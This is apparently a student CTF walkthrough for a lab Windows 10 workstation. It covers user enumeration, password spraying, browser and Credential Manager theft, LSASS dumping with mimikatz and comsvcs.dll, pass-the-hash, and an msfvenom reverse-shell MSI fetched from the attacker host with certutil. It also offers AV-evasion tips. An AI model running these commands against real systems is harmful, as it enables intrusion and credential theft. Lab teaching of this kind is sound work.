# Windows 10 Workstation CTF - Student Walkthrough Guide
**A Realistic Penetration Testing Approach**

> **Note**: This walkthrough approaches the workstation as a real penetration test. We discover vulnerabilities through natural enumeration without prior knowledge. Flags are obfuscated to guide without spoiling the challenge.

## Initial Setup - Preparing for Workstation Compromise

```bash
# Essential tools for workstation attacks
sudo apt update
sudo apt install -y nmap enum4linux smbclient crackmapexec metasploit-framework \
    impacket-scripts hydra evil-winrm bloodhound mitm6 responder \
    powershell-empire covenant lazagne chisel proxychains4 \
    firefox-esr chromium sqlitebrowser dbeaver

# Additional tools for workstation-specific attacks
pip3 install pypykatz minidump minikerberos ldap3 pyasn1

# Clone workstation-focused tools
cd /opt
sudo git clone https://github.com/GhostPack/SharpDump.git
sudo git clone https://github.com/djhohnstein/SharpChrome.git
sudo git clone https://github.com/rasta-mouse/Watson.git
sudo git clone https://github.com/AlessandroZ/LaZagne.git

# Environment setup
export TARGET_WS=192.168.148.102     # Windows 10 Workstation
export TARGET_SRV=192.168.148.101    # Windows Server (for lateral movement)
export LHOST=192.168.148.99          # Your Kali IP
```

## Phase 1: Workstation Discovery and Profiling

### Step 1.1: Initial Network Reconnaissance

Workstations behave differently than servers - they're user-focused:

```bash
# Quick discovery scan
nmap -sn 192.168.148.0/24 | grep -B 2 "up"

# Comprehensive workstation scan
nmap -sC -sV -O -A -p- $TARGET_WS -oA workstation_full

# Focus on workstation-common ports
nmap -sC -sV -p 135,139,445,3389,5040,5357,5985,7680,8080 $TARGET_WS
```

**Alternative Discovery Methods:**
```bash
# ARP scanning (same network)
arp-scan -l
netdiscover -r 192.168.148.0/24

# NetBIOS enumeration
nbtscan 192.168.148.0/24
nmblookup -A $TARGET_WS

# Responder in analyze mode
responder -I eth0 -A
```

### Step 1.2: Operating System Fingerprinting

```bash
# Detailed OS detection
nmap -O --osscan-guess --fuzzy $TARGET_WS

# SMB OS discovery
crackmapexec smb $TARGET_WS

# Check if it's domain-joined or standalone
rpcclient -U "" -N $TARGET_WS -c "lsaquery"
```

## Phase 2: User and Account Enumeration

### Step 2.1: Local User Discovery

Workstations often have multiple local users:

```bash
# Enumerate local users via RPC
rpcclient -U "" -N $TARGET_WS
rpcclient $> enumdomusers
rpcclient $> querydispinfo

# Using enum4linux
enum4linux -U $TARGET_WS | tee users_enum.txt

# CrackMapExec user enumeration
crackmapexec smb $TARGET_WS -u '' -p '' --users
crackmapexec smb $TARGET_WS -u 'guest' -p '' --users --rid-brute
```

When examining users, check ALL properties:
```bash
# For each user found
rpcclient $> queryuser [username]
rpcclient $> queryuseraliases [username]
rpcclient $> queryuser 0x3e8  # Start from RID 1000
```

Look for:
- User descriptions
- Full names (may contain notes)
- Comments fields
- Last logon times (indicates active users)

**FLAG{M***************1}** - Found in jsmith's Full Name field

### Step 2.2: Hidden and Unusual User Accounts

```bash
# Enumerate ALL accounts including hidden
enum4linux -a $TARGET_WS | grep -i "user\|account"

# RID cycling to find hidden users
for i in $(seq 500 1500); do
    rpcclient -U "" -N $TARGET_WS -c "lookupsids S-1-5-21-[DOMAINSID]-$i" 2>/dev/null
done

# Using lookupsid.py
lookupsid.py guest@$TARGET_WS 500-1500
```

Sometimes accounts themselves are interesting:
**FLAG{R***************1}** - Found as a hidden username

### Step 2.3: Password Spraying

Common workstation passwords:

```bash
# Create user list from enumeration
cat users_enum.txt | grep "username:" | cut -d: -f2 > users.txt

# Common workstation passwords
cat > passwords.txt << EOF
Password1
Password123
Welcome1
Welcome123
Summer2024
Winter2024
Company123
Changeme123
Password1!
Welcome1!
EOF

# Password spray with lockout prevention
crackmapexec smb $TARGET_WS -u users.txt -p passwords.txt --continue-on-success --delay 5

# Alternative with Hydra
hydra -L users.txt -P passwords.txt smb://$TARGET_WS -V -t 1
```

**Alternative Authentication Methods:**
```bash
# Try blank passwords
crackmapexec smb $TARGET_WS -u users.txt -p ''

# Try username as password
for user in $(cat users.txt); do
    smbclient -L //$TARGET_WS -U "$user%$user" 2>/dev/null && echo "Found: $user:$user"
done

# Common patterns
for user in $(cat users.txt); do
    for year in 2023 2024 2025; do
        smbclient -L //$TARGET_WS -U "$user%Password$year" 2>/dev/null && echo "Found: $user:Password$year"
    done
done
```

Expected credentials:
- jsmith:Welcome1
- localadmin:Administrator123

## Phase 3: Initial Access and Workstation Enumeration

### Step 3.1: RDP Access

```bash
# Connect with discovered credentials
xfreerdp /v:$TARGET_WS /u:jsmith /p:Welcome1 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp

# Alternative RDP clients
rdesktop -u jsmith -p Welcome1 $TARGET_WS -g 1024x768 -r disk:share=/tmp
```

### Step 3.2: File System Exploration

Once on the system, explore common workstation locations:

```powershell
# User profiles
Get-ChildItem C:\Users\ -Force

# Common document locations
Get-ChildItem C:\Users\Public\Documents -Recurse -Force
Get-ChildItem C:\Users\Public\Downloads -Recurse -Force
Get-ChildItem C:\Users\$env:USERNAME\Desktop -Force
Get-ChildItem C:\Users\$env:USERNAME\Documents -Force

# Look for interesting files
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls*,*.pdf,*.config -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
```

### Step 3.3: SMB Share Enumeration

```bash
# List workstation shares
smbmap -H $TARGET_WS -u jsmith -p Welcome1

# Access each share
smbclient //$TARGET_WS/Users -U jsmith%Welcome1
smb: \> recurse on
smb: \> prompt off
smb: \> dir

# Download everything for analysis
smb: \> mget *
```

### Step 3.4: Sensitive File Discovery

Look for typical workstation files:

```powershell
# WiFi passwords
Get-ChildItem -Path C:\ -Recurse -Include "*wifi*","*wireless*" -ErrorAction SilentlyContinue
type C:\Users\Public\Documents\wifi.txt
```

**FLAG{P***************0}** - Found in wifi.txt

```powershell
# Email/password files
Get-ChildItem -Path C:\ -Recurse -Include "*password*","*email*","*credential*" -ErrorAction SilentlyContinue
type C:\Users\Public\Documents\Passwords\email.txt
```

**FLAG{F***************8}** - Found in email.txt

### Step 3.5: Hidden Files

```powershell
# Show hidden files
Get-ChildItem C:\WorkFiles -Force -Attributes Hidden
Get-ChildItem C:\ -Recurse -Hidden -ErrorAction SilentlyContinue | Where-Object {$_.Name -like ".*"}

# Check with attrib
attrib /s /d C:\WorkFiles\*
cmd /c "dir /a:h C:\WorkFiles"

# Read hidden files
Get-Content C:\WorkFiles\.flag -Force
```

**FLAG{S***************2}** - Found in hidden .flag file

## Phase 4: Browser and Application Data

### Step 4.1: Browser Credential Extraction

Workstations store browser passwords:

```powershell
# Chrome profile location
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
ls $chromePath

# Copy Login Data for analysis
Copy-Item "$chromePath\Login Data" C:\temp\chrome_login.db

# Firefox profile
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
Get-ChildItem $firefoxPath -Recurse -Include "logins.json","key*.db"
```

To extract passwords:
```bash
# Transfer chrome_login.db to Kali
# Open with SQLite browser
sqlitebrowser chrome_login.db
# Check 'logins' table

# Or use LaZagne
python laZagne.py browsers
```

**FLAG{N***************6}** - Found in browser saved passwords

**Alternative Browser Extraction:**
```powershell
# Using SharpChrome (if you can compile/upload)
.\SharpChrome.exe logins

# Manual Chrome extraction
$dataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$query = "SELECT origin_url, username_value, password_value FROM logins"
# Need to decrypt using DPAPI

# Edge passwords
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
```

### Step 4.2: Application Credentials

```powershell
# Sticky Notes (Windows 10)
Get-ChildItem "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes*\LocalState"
type "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"

# Read Sticky Notes database
# Contains: FLAG{W***************3}
```

```powershell
# Clipboard content
Get-Clipboard
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()
```

**FLAG{K***************8}** - Found in clipboard

### Step 4.3: Credential Manager

```powershell
# Windows Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# PowerShell method
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()
```

## Phase 5: Privilege Escalation

### Step 5.1: Service Enumeration

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell method
Get-WmiObject win32_service | Where-Object {
    $_.PathName -notmatch '"' -and 
    $_.PathName -notmatch 'C:\\Windows' -and
    $_.StartMode -ne 'Disabled'
} | Select-Object Name, DisplayName, PathName, StartMode

# Check specific services
sc qc FakeAntivirus
sc qc BackupManager
sc qc RemoteSupportAgent
```

For unquoted paths like `C:\Program Files\Antivirus Software\Engine\av.exe`:
```powershell
# Test write permissions
icacls "C:\Program Files\"
icacls "C:\Program Files\Antivirus Software\"

# Create hijack executable
echo 'whoami > C:\proof.txt' > "C:\Program.bat"
# or
Copy-Item C:\Windows\System32\cmd.exe "C:\Program Files\Antivirus.exe"

# Restart service
Restart-Service FakeAntivirus
# or
sc stop FakeAntivirus
sc start FakeAntivirus

# Check results
type C:\ws_unquoted1.txt
```

**FLAG{N***************6}** - From FakeAntivirus
**FLAG{C***************9}** - From BackupManager  
**FLAG{N***************6}** - From RemoteSupportAgent

### Step 5.2: AlwaysInstallElevated

```powershell
# Check if vulnerable
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both should return 0x1
```

Exploitation:
```bash
# From Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o privesc.msi

# Start handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 4444; run"

# On target
certutil -urlcache -f http://$LHOST/privesc.msi privesc.msi
msiexec /quiet /qn /i privesc.msi

# As SYSTEM
type C:\Users\Administrator\Desktop\msi_privesc_flag.txt
```

**FLAG{W***************5}** - After MSI privilege escalation

### Step 5.3: Scheduled Tasks

```powershell
# Enumerate all scheduled tasks
schtasks /query /fo LIST /v | findstr "TaskName\|Run As User\|Task To Run"

# PowerShell detailed view
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select-Object TaskName, TaskPath, State

# Check for stored credentials
Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object {$_.LogonType -eq 'Password'}

# Specific task
schtasks /query /tn "\DailyUpdate" /fo LIST /v
```

Run and check output:
```powershell
schtasks /run /tn "\DailyUpdate"
Start-Sleep -Seconds 5
type C:\temp\task_ws.txt
```

**FLAG{V***************0}** - From scheduled task

### Step 5.4: Registry Persistence

```powershell
# Check Run keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# RunOnce keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -ErrorAction SilentlyContinue

# Check what they execute
cmd /c echo test > C:\Windows\Temp\regflag.txt
type C:\Windows\Temp\regflag.txt
```

**FLAG{P***************5}** - From registry Run key

### Step 5.5: Startup Folder

```powershell
# User startup
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Get-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat"

# All users startup
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

**FLAG{V***************1}** - In startup script

## Phase 6: Advanced Credential Harvesting

### Step 6.1: LSASS Memory Dump

After privilege escalation:

```powershell
# Method 1: Mimikatz
Invoke-WebRequest -Uri "http://$LHOST/mimikatz.exe" -OutFile "C:\temp\m.exe"
C:\temp\m.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::msv
```

Look for non-standard entries:
**FLAG{B***************0}** - In LSASS memory

**Alternative LSASS Dumping:**
```powershell
# Method 2: ProcDump (signed by Microsoft)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: MiniDump via comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\temp\lsass.dmp full

# Method 4: Direct copy (requires SYSTEM)
Copy-Item C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\lsass.dmp C:\temp\

# Analyze offline with pypykatz
pypykatz lsa minidump lsass.dmp
```

### Step 6.2: Debug Privileges

```powershell
# Check who has SeDebugPrivilege
whoami /priv

# Login as debuguser if found
runas /user:debuguser powershell
# Password: Debugger123!

# With debug privileges
reg query "HKLM\SOFTWARE\DebugPrivileges"
```

**FLAG{V***************2}** - In DebugPrivileges registry

### Step 6.3: Pass-the-Hash from Workstation

```bash
# Using extracted NTLM hashes
impacket-psexec -hashes :5835048ce94ad0564e29a924a03510ef localadmin@$TARGET_WS

# CrackMapExec PTH
crackmapexec smb $TARGET_WS -u localadmin -H 5835048ce94ad0564e29a924a03510ef --local-auth

# Access Administrator desktop
cmd.exe
type C:\Users\Administrator\Desktop\pth_workstation_flag.txt
```

**FLAG{B***************0}** - After successful PTH

### Step 6.4: DPAPI Decryption

```powershell
# Find DPAPI encrypted files
Get-ChildItem -Path C:\ -Recurse -Include "*.bin","*.blob" -ErrorAction SilentlyContinue

# Found: C:\Users\Public\Documents\dpapi_flag.bin

# Using Mimikatz
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin

# Alternative: PowerShell (if same user context)
$encrypted = [System.IO.File]::ReadAllBytes("C:\Users\Public\Documents\dpapi_flag.bin")
$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
[System.Text.Encoding]::UTF8.GetString($decrypted)
```

**FLAG{T***************3}** - From DPAPI blob

## Phase 7: Workstation-Specific Vectors

### Step 7.1: VPN Configuration

```powershell
# Search for VPN configs
Get-ChildItem -Path C:\ -Recurse -Include "*vpn*","*.ovpn","*.pcf" -ErrorAction SilentlyContinue
rasphone -f
Get-VpnConnection

# Check credentials folder
type C:\Users\Public\Documents\Credentials\vpn.txt
```

**FLAG{D***************9}** - In VPN configuration

### Step 7.2: PowerShell Credentials

```powershell
# Find exported credentials
Get-ChildItem -Path C:\ -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue | Select-String -Pattern "PSCredential"

# Common locations
dir C:\Users\*\Documents\*cred*.xml
dir C:\Scripts\*cred*.xml
dir C:\Automation\*cred*.xml

# If found
$cred = Import-Clixml C:\Users\Public\Documents\Credentials\admin.xml
# Check the XML directly for comments
type C:\Users\Public\Documents\Credentials\admin.xml
```

**FLAG{P***************9}** - In credential XML

### Step 7.3: Document Analysis

```powershell
# Find Office documents
Get-ChildItem -Path C:\Users -Recurse -Include "*.doc*","*.xls*","*.ppt*" -ErrorAction SilentlyContinue

# Macro-enabled documents
Get-ChildItem -Path C:\ -Recurse -Include "*.docm","*.xlsm","*.pptm" -ErrorAction SilentlyContinue

# Check Important folder
dir C:\Users\Public\Documents\Important\
type C:\Users\Public\Documents\Important\Invoice.docm
```

**FLAG{G***************8}** - In macro document

### Step 7.4: HTA Files

```powershell
# Find HTA files
Get-ChildItem -Path C:\ -Recurse -Filter "*.hta" -ErrorAction SilentlyContinue

# Check content
type C:\Users\Public\Documents\Important\portal.hta
Select-String -Path C:\Users\Public\Documents\Important\portal.hta -Pattern "<!--.*-->"
```

**FLAG{P***************5}** - In HTA comment

### Step 7.5: DLL Hijacking

```powershell
# Check PATH variable
$env:Path -split ';'

# Find writable directories in PATH
foreach ($dir in $env:Path -split ';') {
    if (Test-Path $dir) {
        $acl = Get-Acl $dir
        $acl.Access | Where-Object {$_.IdentityReference -match "Users"}
    }
}

# Check custom directory
icacls C:\ProgramData\Custom
type C:\ProgramData\Custom\readme.txt
```

**FLAG{G***************9}** - In DLL hijack location

### Step 7.6: Print Spooler

```powershell
# Check Print Spooler vulnerability
Get-Service Spooler
icacls C:\Windows\System32\spool\drivers\color

# If vulnerable
dir C:\Windows\System32\spool\drivers\color\
type C:\Windows\System32\spool\drivers\color\workstation_spooler_flag.txt
```

**FLAG{G***************5}** - In spooler directory

### Step 7.7: Desktop Shortcuts

```powershell
# Analyze shortcuts
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\Public\Desktop\Server Shares.lnk")
$Shortcut | Select-Object *

# Check properties
$Shortcut.TargetPath
$Shortcut.Arguments
$Shortcut.Description
```

**FLAG{P***************0}** - In shortcut description

### Step 7.8: Recycle Bin

```powershell
# Access Recycle Bin
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.NameSpace(10)
$recycleBin.Items() | ForEach-Object {
    Write-Host $_.Name
    if ($_.Name -like "*flag*" -or $_.Name -like "*deleted*") {
        $_.InvokeVerb("restore")
    }
}

# Direct access
Get-ChildItem 'C:\$Recycle.Bin' -Recurse -Force | Where-Object {$_.Name -notlike "`$*"}
```

**FLAG{M***************9}** - In deleted file

## Phase 8: Lateral Movement Preparation

### Step 8.1: Network Mapping

```powershell
# Discover other systems
arp -a
nslookup -type=ANY _ldap._tcp
net view
Get-NetNeighbor

# Test connectivity to server
Test-NetConnection $TARGET_SRV -Port 445
```

### Step 8.2: Cached Credentials

```powershell
# View cached credentials
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr

# Stored RDP credentials
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
```

### Step 8.3: Prepare for Server Attack

```powershell
# Map network drive to server
net use Z: \\$TARGET_SRV\Public /persistent:yes

# Test credentials against server
runas /netonly /user:Administrator cmd
# Then: dir \\$TARGET_SRV\C$
```

## Alternative Tools and Methodologies

### Enumeration Alternatives:

**For User Discovery:**
- `enum4linux -U` - Classic enumeration
- `rpcclient` - Direct RPC queries
- `ldapsearch` - If LDAP is exposed
- `kerbrute` - Kerberos user enumeration
- `crackmapexec --users` - Modern enumeration

**For File Discovery:**
- `find / -name "*.txt" 2>/dev/null` - Linux style
- `Get-ChildItem -Recurse` - PowerShell
- `dir /s /b` - Classic CMD
- `Everything.exe` - Fast Windows search
- `Agent Ransack` - GUI file search

**For Service Enumeration:**
- `sc query` - Service Control
- `wmic service` - WMI queries
- `Get-Service` - PowerShell
- `services.msc` - GUI
- `PsService` - Sysinternals

### Privilege Escalation Alternatives:

**Automated Tools:**
- `WinPEAS.exe` - Comprehensive enumeration
- `PowerUp.ps1` - PowerShell privesc
- `SharpUp.exe` - C# implementation
- `Seatbelt.exe` - Security checks
- `Watson.exe` - Missing patches

**Manual Methods:**
- Token impersonation
- DLL hijacking
- Service hijacking
- Registry autoruns
- Scheduled tasks
- Startup folders

### Credential Extraction Alternatives:

**Memory Dumping:**
- `Mimikatz` - Gold standard
- `ProcDump` - Microsoft signed
- `comsvcs.dll` - Living off the land
- `SharpDump` - C# implementation
- `nanodump` - Stealthy dumping

**Password Recovery:**
- `LaZagne` - Multi-application
- `SharpChrome` - Chrome focused
- `SharpDPAPI` - DPAPI decryption
- `mimipenguin` - Linux memory
- `SecretsDump` - Registry extraction

## Troubleshooting Common Issues

### Issue: Can't connect to SMB
```bash
# Try different protocols
smbclient -L //$TARGET_WS --option='client min protocol=NT1'
# or
crackmapexec smb $TARGET_WS --port 445
```

### Issue: RDP won't connect
```bash
# Check RDP is enabled
nmap -p 3389 --script rdp-enum-encryption $TARGET_WS

# Try different security settings
xfreerdp /v:$TARGET_WS /u:user /p:pass /sec:rdp
xfreerdp /v:$TARGET_WS /u:user /p:pass /sec:tls
xfreerdp /v:$TARGET_WS /u:user /p:pass /sec:nla
```

### Issue: Mimikatz detected
```powershell
# Use obfuscated version
Invoke-Obfuscation

# Use reflective DLL injection
Invoke-ReflectivePEInjection

# Use process hollowing
Invoke-ProcessHollowing
```

### Issue: Can't escalate privileges
```powershell
# Try different vectors
# 1. Check for vulnerable services
# 2. Check for vulnerable drivers
# 3. Check for missing patches
# 4. Check for credential reuse
# 5. Check for misconfigurations
```

## Key Differences: Workstation vs Server

**Workstation Specific:**
1. **Browser data** - Saved passwords, cookies, history
2. **User documents** - Personal files, notes
3. **Clipboard** - Active copying
4. **Sticky Notes** - Quick password storage
5. **Recent files** - User activity
6. **Cached credentials** - Multiple login sessions

**Common Mistakes to Avoid:**
1. Don't overlook user behavior patterns
2. Check ALL user folders, not just current
3. Browser data needs DPAPI decryption
4. Recycle Bin can contain treasures
5. Shortcuts have metadata
6. Startup folders vary per user

## Final Recommendations

1. **Document Everything**: Keep detailed notes
2. **Screenshot Evidence**: Capture proof of access
3. **Try Multiple Approaches**: Different tools reveal different data
4. **Understand the User**: Think about user behavior
5. **Check Timestamps**: Recent files are often important
6. **Persistent Access**: Establish multiple footholds
7. **Clean Up**: Remove tools and traces (in real tests)

Remember: Real penetration tests require:
- Written authorization
- Defined scope
- Professional reporting
- Risk assessment
- Remediation advice

This walkthrough demonstrates realistic workstation compromise techniques, focusing on user-centric vulnerabilities and natural discovery processes.